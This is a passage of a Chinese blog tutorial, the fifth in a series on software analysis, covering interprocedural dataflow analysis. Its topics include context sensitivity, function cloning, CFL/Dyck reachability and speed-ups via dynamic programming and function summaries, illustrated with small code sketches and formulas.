    <content type="html"><![CDATA[<blockquote><ol class="series-items"><li><a href="/pl/understanding-program-analysis/" title="（一）初识软件分析">（一）初识软件分析</a></li><li><a href="/pl/data-flow-analysis/" title="（二）数据流分析基础">（二）数据流分析基础</a></li><li><a href="/pl/LP-souffle/" title="（三）Datalog和程序分析">（三）Datalog和程序分析</a></li><li><a href="/pl/ssa-and-sparse-analysis/" title="（四）静态单赋值和稀疏分析">（四）静态单赋值和稀疏分析</a></li><li><a href="/pl/Interprocedural-DFA/" title="（五）过程间分析">（五）过程间分析</a></li><li><a href="/pl/points-to-analysis/" title="（六）指向分析">（六）指向分析</a></li><li><a href="/pl/abstract-interpretation/" title="（七）抽象解释">（七）抽象解释</a></li><li><a href="/pl/SMT-and-symbolic-excution/" title="（八）SMT和符号执行">（八）SMT和符号执行</a></li><li><a href="/pl/static-analysis-tools/" title="（九）体验静态分析工具">（九）体验静态分析工具</a></li><li><a href="/pl/fuzzing-introduction/" title="（十）Fuzzing 基础">（十）Fuzzing 基础</a></li></ol></blockquote><p>之前我们所有的分析都是没有函数调用的，也就是之前考虑的情况都是「过程内」的调用。本章将会考虑函数调用，开始「过程间」分析（Whole Program Analysis 或者 Link-time Analysis）的学习。</p><h1>基本思路</h1><p>每个过程内分析对应一个抽象域，然后函数调用时，每个函数都是新的过程内分析。那么，只要考虑两个过程内分析的衔接即可。例如对下面的程序，在函数 A 内调用函数 B 时，其实就是过程间分析，调用和返回时对节点进行转换即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">B</span><span class="params">(x,y)</span>&#123;</span><br><span class="line">    z = x+y;</span><br><span class="line">    <span class="keyword">return</span> z;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">A</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">20</span>;</span><br><span class="line">    <span class="type">int</span> c = B(a,b);</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="http://cdn.blog-blockchain.xyz/202210101947235.png" alt="image-20221010194756153" style="zoom:80%;" /><h2 id="全局变量">全局变量</h2><p>如果出现了全局变量就会比较麻烦，那么过程间分析如何处理全局变量呢，一个办法是在所有的基本块中都添加全局变量，或者可以改进，只在读写了全局变量的过程内调用和调用了这个函数的地方添加全局变量。这其中比较烦的问题是，如果函数调用的层级比较深，那么其中的每个函数都要增加全局变量。例子如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">B</span><span class="params">(x,y)</span>&#123;</span><br><span class="line">    g = x+y;</span><br><span class="line">    <span class="keyword">return</span> g;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">A</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">int</span> g;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">20</span>;</span><br><span class="line">    <span class="type">int</span> c = B(a,b);</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="http://cdn.blog-blockchain.xyz/202210101956975.png" alt="image-20221010195609935" style="zoom:120%;" /><h2 id="精度损失">精度损失</h2><p>假设 A 和 C 都调用了函数 B，然后也是采用 调用-返回 来执行过程间分析，那么函数 B 中变量改变了，又同时作为 A 和 C 的前驱节点，这样假如 A 改变了，那么 B 作为后续的过程也会发生改变，同时函数 B 中有 C 的前驱节点，C 也要重新评估。也就是说，只是因为调用函数 A，却导致了函数 C 的值也发生了变化。</p><img src="https://cdn.blog-blockchain.xyz/202210102018880.png" alt="image-20221010201822825" style="zoom:67%;" /><p>由于这种失真的触发条件非常容易，只要一个函数同时调用两次，就会出现问题，导致程序分析的结果非常不准确。</p><h1>克隆和上下文敏感性</h1><p>上下文指的是语句所在的环境，比如前后的语句和变量。上下文非敏感分析（Context-insensitive analysis） 在过程调用的时候忽略调用的上下文，因为上下文不会影响结果。上下文敏感分析 Context-sensitive analysis 则需要考虑上下文。类似的，控制流敏感只是把上下文改成了控制流中的分支，定义类似。</p><p>更加直接地理解，上下文不同的函数可以理解为不同调用位置的函数。特别地，对于递归函数，输入不同，那么上下文可能不同，有无限可能。所以，尽管递归函数在一个位置调用，但是从控制流的角度，上下文随着输入的不同，是不一样的。</p><p>为了解决上面的问题，很直观的想法是，在上下文敏感的调用位置处，都<strong>克隆</strong>一遍这个函数，让各处调用没有联系。</p><img src="http://cdn.blog-blockchain.xyz/202210102210649.png" alt="image-20221010221016572" style="zoom:50%;" /><h2 id="克隆的问题">克隆的问题</h2><p>但是，对于嵌套的函数，比如 A 调用 2 次 B，B 调用 2 次 C，C 调用 2 次 D。如果只是调用 A 一次，那么需要克隆 2*2*2=8 次 函数 D。对于一些面向对象的语言或者函数式语言，克隆发将会带来很大开销，根据调用深度指数增长。</p><p>另外，对于递归函数，自身无法静态地确定调用的次数，而且克隆次数非常多。无法处理这种情况。</p><p>为了解决上面的问题，提出了两种方案。</p><img src="http://cdn.blog-blockchain.xyz/202210102229483.png" alt="image-20221010222919337" style="zoom:50%;" /><p>如果读者没有理解「上下文」的含义，请回顾上一小节。解决方案 1 容易理解，解决方案 2 通过下面的例子学习。首先看明白递归函数的控制流图：</p><p><img src="http://cdn.blog-blockchain.xyz/202210102253986.png" alt="image-20221010225331822"></p><p>笔者也不想重新画这个图，于是结合文字理解吧。Enter 入口之后是一个分叉，表示控制分支。分支坐标是赋值语句，然后是 return 处的交汇，接着就退出函数。</p><p>右边首先是 2 号位置的 fib 函数，会递归调用自身。然后直到走左边的分支，从 Exit 最右边的线，返回到右边一列的第二个方格，然后给 y 赋值，接着进入 3 号 fib 函数，同样直到走左边的分支，然后从 Exit 进入右边倒数第二个的方格，接着给 z 赋值，再计算 x=y+z，最后交汇运算，Exit，完成整个调用。</p><p>然后，我们再看下面调用深度为 1 的情况。标号在代码中，context 1 是 main 函数中的调用，结束后直接返回即可。context 2 表示 2 号调用，有三个入口，一个是初始的调用，一个是自身的反复调用，一个是来自 3 号的调用。context 2 的调用结束之后，开始 3 号的调用。context 3 则有 2 个入口，分别是调用完 2 号后到 3 号，还有是直接在 context 1 中的调用。</p><img src="http://cdn.blog-blockchain.xyz/202210102241237.png" alt="image-20221010224147172" style="zoom: 67%;" /><p>递归调用肉眼可见的复杂，主要是要理解三个上下文对应的情况，读者不理解的话，可以多次琢磨。下面是两层的情况，读者直观看一眼，理解方法即可。</p><img src="http://cdn.blog-blockchain.xyz/202210102320442.png" alt="image-20221010232001361" style="zoom: 50%;" /><p>总的来说，递归函数调用深度越深，那么分析越准确，但是复杂度指数上升。</p><h2 id="不同的上下文类型">不同的上下文类型</h2><p>以上的讨论都是基于调用位置的上下文，但是在具体分析的过程中，会设置不同的上下文定义，方便各种不同的分析。</p><ol><li><strong>基于函数名字</strong>而不是调用位置的上下文。不如调用位置精确，但能减少复制量。</li><li><strong>基于对象类型</strong>的类型的上下文。在面向对象语言中，对于<code>x.p()</code> 的调用，根据 x 的不同类型区分上下文。比如接口类型或者函数重载，就会出现 duck type.</li><li><strong>基于系统状态</strong>的上下文。根据分析需要，对系统的当前状态进行分类，当函数以不同状态调用时，对函数复制。</li></ol><h2 id="克隆的例子">克隆的例子</h2><p>数据流分析默认所有分支可达，但是如果实际上可能会出现互斥的情况。例如下面的代码，因为 <code>condition1</code> 和 <code>condition2</code> 互斥，所以只有如下几种调用情况 <code>x n  </code> 或者 <code>y m</code>，按照之前的做法，每个分支都会交汇，造成了允许 <code>x m</code> 这种不可能的情况。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">condition1 = <span class="keyword">not</span> condition2</span><br><span class="line"><span class="keyword">if</span> condition1:</span><br><span class="line">    x();</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    y();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> condition2:</span><br><span class="line">    m();</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    n();</span><br></pre></td></tr></table></figure><p>但是，如果通过克隆的方法，不局限在克隆函数，自定义上下文为「<strong>第一个 if 语句的条件为 true 还是 false</strong>」，那么克隆第二个 if 语句，上面的式子可以写作：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">condition1 = <span class="keyword">not</span> condition2</span><br><span class="line"><span class="keyword">if</span> condition1:</span><br><span class="line">    x();</span><br><span class="line">    <span class="keyword">if</span> condition2:</span><br><span class="line">    m();</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    n();</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    y();</span><br><span class="line">    <span class="keyword">if</span> condition2:</span><br><span class="line">    m();</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    n();</span><br></pre></td></tr></table></figure><p>克隆之前之前，会分别跑完 <code>x()，y()</code>，然后在 <code>x(), y()</code> 的出口处，对全局变量进行交汇操作(用静态单赋值算法确定需要交汇哪些变量)，之后再执行第二个 if 控制流；</p><p>克隆之后，只会分别执行<code>x()</code> , <code> y()</code>，例如执行完 x() 之后，再执行 <code>m(),n()</code>，在出口处交汇第二个 if 执行的全局变量。最后再分别交汇第一个 if 的两个分支。</p><p>课件里说第二种情况会更加精确，笔者理解为，第二种情况在执行 m()、n()的时候，上下文会更加精确，具体来说是全局变量的值更加精确。但是多了一次第一个 if 结束的交汇操作，笔者就有点扯不清了。后续深入学习或许会从理论角度来填坑。</p><p>除了上面提到的是<strong>基于系统状态分类的语句级别的复制</strong>。之前举的递归函数的例子，或者循环的例子(类似递归，可以展开 k 层，上下文是上一层循环和下一层循环)都是 clone 方法的应用。</p><p>实际上，<strong>克隆的方法等效于 inline</strong>（内联：把被调函数的代码嵌入到调用函数中，对 参数进行改名替换）。</p><h1>精确的上下文敏感分析</h1><p>以上提到的分析，都是因为过程间调用（比如函数调用）会导致其他调用的地方意外地更新节点，提出了基于克隆的的方案。考虑到递归、多次循环等上下文非常复杂，只是局限在前 k 层分析。但是，精确的上下文敏感分析的目标就是，<strong>让每一次调用都和上下文匹配，也就是说，对于任意分析中考虑的路径，路径中的调用边和返回边全部匹配（称为可行路径）</strong>。</p><p>历史上提出过多种精确上下文敏感分析方法</p><ul><li>Functional</li><li>Dataflow Facts-based Summary</li><li>CFL-reachability</li></ul><p>近年来的研究逐渐集中在 Thomas Reps 提出的 CFLReachability 上，优点是：</p><ul><li>理解上比较直观，可以画图说明。</li><li>能够优化出高效算法</li><li>能覆盖任意的具备分配性的数据流分析（但不能覆盖所有已有方法）</li><li>基于该模型讨论清楚了若干可判定性问题。</li></ul><p>在解决具体问题之前，先了解 <code>Dyck-CFL</code>，其中 <code>CFL</code> 指的是 Context-free language，我暂时不是很熟悉编译原理，所以不深究。维基百科介绍如下：</p><blockquote><p>In <a href="https://en.wikipedia.org/wiki/Formal_language_theory">formal language theory</a>, a <strong>context-free language</strong> (<strong>CFL</strong>) is a <a href="https://en.wikipedia.org/wiki/Formal_language">language</a> generated by a <a href="https://en.wikipedia.org/wiki/Context-free_grammar">context-free grammar</a> (CFG).</p><p>Context-free languages have many applications in <a href="https://en.wikipedia.org/wiki/Programming_languages">programming languages</a>, in particular, most arithmetic expressions are generated by context-free grammars.</p></blockquote><p>而 <code>Dyck</code> 语言是基于括号匹配的语言，具体见 <a href="https://en.wikipedia.org/wiki/Dyck_language">wiki</a>。最关键的介绍是，用于判断嵌套的括号是否匹配。</p><blockquote><p>In the theory of <a href="https://en.wikipedia.org/wiki/Formal_languages">formal languages</a> of <a href="https://en.wikipedia.org/wiki/Computer_science">computer science</a>, <a href="https://en.wikipedia.org/wiki/Mathematics">mathematics</a>, and <a href="https://en.wikipedia.org/wiki/Linguistics">linguistics</a>, a <strong>Dyck word</strong> is a balanced <a href="https://en.wikipedia.org/wiki/String_(computer_science)#Formal_theory">string</a> of square brackets [ and ]. The set of Dyck words forms the <strong>Dyck language</strong>.</p><p>Dyck words and language are named after the mathematician <a href="https://en.wikipedia.org/wiki/Walther_von_Dyck">Walther von Dyck</a>. They have applications in the <a href="https://en.wikipedia.org/wiki/Parsing">parsing</a> of expressions that must have a correctly nested sequence of brackets, such as arithmetic or algebraic expressions.</p></blockquote><p>那么，在每一处过程间调用的入口，都根据上下文调用和返回，做括号的匹配，就会涉及到 <code>Dyck CFL</code> ，确定嵌套的括号匹配必须正确，<strong>让程序分析只跑括号正确匹配的路径（可行路径）</strong>。</p><img src="http://cdn.blog-blockchain.xyz/202210202128617.png" alt="image-20221020212816518" style="zoom:50%;" /><p>回顾数据流分析的分配性：</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi mathvariant="normal">∀</mi><mi>v</mi><mo>∈</mo><mi>V</mi><mo separator="true">,</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo>∈</mo><mi>S</mi><mo>:</mo><msub><mi>f</mi><mi>v</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>⊓</mo><msub><mi>f</mi><mi>v</mi></msub><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><msub><mi>f</mi><mi>v</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo>⊓</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\forall v \in V, x, y \in S: f_{v}(x) \sqcap f_{v}(y)=f_{v}(x \sqcap y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335em;vertical-align:-0.0391em;"></span><span class="mord">∀</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊓</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1076em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊓</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span></span></p><p>结合数据流分析的过程，可以容易得到如下的推论：</p><img src="http://cdn.blog-blockchain.xyz/202210202149717.png" alt="image-20221020214915642" style="zoom:50%;" /><p>这就导出了一个非常有意思的结论了，<strong>如果数据流分析满足分配性，我们可以把初始值 A 拆成多个不同的初始值 B C D 的交汇，那么不好处理的初始值 A，就可以转换成好处理的初始值 B C D，任意一个数据节点的值也可以由 B C D 对应的数据节点交汇得出</strong>。</p><p>一般地说，KILL-GEN 这种标准的数据流分析是满足分配性的。下图来自 <a href="https://karkare.github.io/cs738/lecturenotes/03DataFlowAnalysisHandout.pdf">https://karkare.github.io/cs738/lecturenotes/03DataFlowAnalysisHandout.pdf</a></p><img src="http://cdn.blog-blockchain.xyz/202210202209203.png" alt="image-20221020220952140" style="zoom:80%;" /><p>我们抽象出来函数</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>f</mi><mrow><mo fence="true">(</mo><mi>x</mi><mo fence="true">)</mo></mrow><mo>=</mo><mrow><mo fence="true">(</mo><mi>x</mi><mo>−</mo><mrow><mo fence="true">{</mo><mi>a</mi><mo fence="true">}</mo></mrow><mo fence="true">)</mo></mrow><mo>∪</mo><mi>c</mi><mo separator="true">,</mo><mi>U</mi><mo>=</mo><mrow><mo fence="true">{</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo separator="true">,</mo><mi>c</mi><mo fence="true">}</mo></mrow><mo separator="true">,</mo><mi>x</mi><mo>⊆</mo><mi>U</mi></mrow><annotation encoding="application/x-tex">f\left( x \right) =\left( x-\left\{ a \right\} \right) \cup c,U=\left\{ a,b,c \right\} , x\subseteq U</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">x</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">{</span><span class="mord mathnormal">a</span><span class="mclose delimcenter" style="top:0em;">}</span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">c</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">{</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">c</span><span class="mclose delimcenter" style="top:0em;">}</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⊆</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span></span></span></span></span></p><p>那么全集 U 的子集为</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mrow><mo fence="true">{</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo separator="true">,</mo><mi>c</mi><mo fence="true">}</mo></mrow><mo separator="true">,</mo><mrow><mo fence="true">{</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo fence="true">}</mo></mrow><mo separator="true">,</mo><mrow><mo fence="true">{</mo><mi>a</mi><mo separator="true">,</mo><mi>c</mi><mo fence="true">}</mo></mrow><mo separator="true">,</mo><mrow><mo fence="true">{</mo><mi>b</mi><mo separator="true">,</mo><mi>c</mi><mo fence="true">}</mo></mrow><mo separator="true">,</mo><mrow><mo fence="true">{</mo><mi>a</mi><mo fence="true">}</mo></mrow><mo separator="true">,</mo><mrow><mo fence="true">{</mo><mi>b</mi><mo fence="true">}</mo></mrow><mo separator="true">,</mo><mrow><mo fence="true">{</mo><mi>c</mi><mo fence="true">}</mo></mrow></mrow><annotation encoding="application/x-tex">\left\{ a,b,c \right\} ,\left\{ a,b \right\} ,\left\{ a,c \right\} ,\left\{ b,c \right\} ,\left\{ a \right\} ,\left\{ b \right\} ,\left\{ c \right\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">{</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">c</span><span class="mclose delimcenter" style="top:0em;">}</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">{</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose delimcenter" style="top:0em;">}</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">{</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">c</span><span class="mclose delimcenter" style="top:0em;">}</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">{</span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">c</span><span class="mclose delimcenter" style="top:0em;">}</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">{</span><span class="mord mathnormal">a</span><span class="mclose delimcenter" style="top:0em;">}</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">{</span><span class="mord mathnormal">b</span><span class="mclose delimcenter" style="top:0em;">}</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">{</span><span class="mord mathnormal">c</span><span class="mclose delimcenter" style="top:0em;">}</span></span></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span> 的结果必然在子集之中，并且存在输入到输出的对应关系</p><img src="http://cdn.blog-blockchain.xyz/202210202222501.png" alt="image-20221020222227456" style="zoom:50%;" /><p>当 x 取集合 {a, b} 时，根据分配性，只需要交汇 f(a) 和 f(b) 即可，假如交汇是取集合并集的话，那么就把 a 对应的集合和 b 对应的集合取并。虽然以上只是进行了一步的状态转换，但是多次转换也是同样的原理。这样就<strong>将数据流分析转换成了一张图</strong>。</p><p>下面是分析未初始化变量的图，<code>READ</code> 表示从键盘读取然后写入变量。节点转换的连线表示输入的节点，就会影响输出的节点是否初始化，这样的映射关系也就是状态转化函数。</p><p>首先，x, g 从读取空值，也就是没有初始化。然后 x 被赋值，所以不再影响下一个个节点。接着进入调用 P，先标记左括号 1。注意，每个节点并不知道自己的数据是否是未初始化，只知道节点转化的规则。进入调用 P 后，标记左括号 2。在节点 n5，从键盘读取了数据写入 g，所以从变量 g 开始的边断了。节点 n6 处 a 或者 g 未初始化，那么 a 就会未初始化。</p><p><strong>未初始化的变量，就是从入口开始，通过有向图可以到达（条件包括路径可达和括号匹配）的任意节点处的变量，就有可能是未初始化的变量</strong>。这就将数据流分析转化成了图可达性问题。</p><p>注意到 n4 分支处交汇，如果直接交汇，忽视了分支，其实还是会比较可惜，日后会学习更加精细的做法。</p><p><img src="http://cdn.blog-blockchain.xyz/202210210006300.png" alt="image-20221021000635197"></p><p>下面是上下文无关语言钟正式一些的可达性定义：</p><img src="http://cdn.blog-blockchain.xyz/202210210106033.png" alt="image-20221021010651962" style="zoom:50%;" /><p>而可达性在 Datalog 中很容易推导。最直接的算法就是加边，递归的按照下面的三种方式加边，如果有直接相连的边，那么就是可达，虚线表示可达。</p><img src="http://cdn.blog-blockchain.xyz/202210212032498.png" alt="image-20221021203227434" style="zoom:50%;" /><h1>加快分析速度</h1><p>过程间分析相较过程内分析，是非常吃性能的事情，动则分布在几十个文件中几万行的代码互相调用，所以编译器一般都会默认关闭过程间分析。加快分析速度也是较为重要的问题。比如克隆的部分如果特别大，那么程序分析的开销就是非常大。</p><p>加速技术主要有两类，动态规划也就是记忆化搜索，比如 A-&gt;B-&gt;C-&gt;D，可以在搜索时记忆 A-&gt;C 是成立的，然后只要判断 C-&gt;D 是否成立即可。实际上也还有其他的形式。</p><p>另外一种就是函数摘要，函数调用往往存在嵌套的调用，A() 在内部调用 B()，B() 在内部调用 C() D()，如果每一次都遍历到最底层的函数，那么将会耗费大量的时间。因此可以合并函数内部的函数，特别是库函数重用很多。而且如果源代码改变，摘要不需要全部改动，只要改变涉及到的那一部分的函数摘要即可。</p><img src="http://cdn.blog-blockchain.xyz/202210212039739.png" alt="image-20221021203918618" style="zoom: 50%;" /><h2 id="基于动态规划">基于动态规划</h2><p>对于某些函数，可以记忆 Entry 抽象状态输入和 Exit 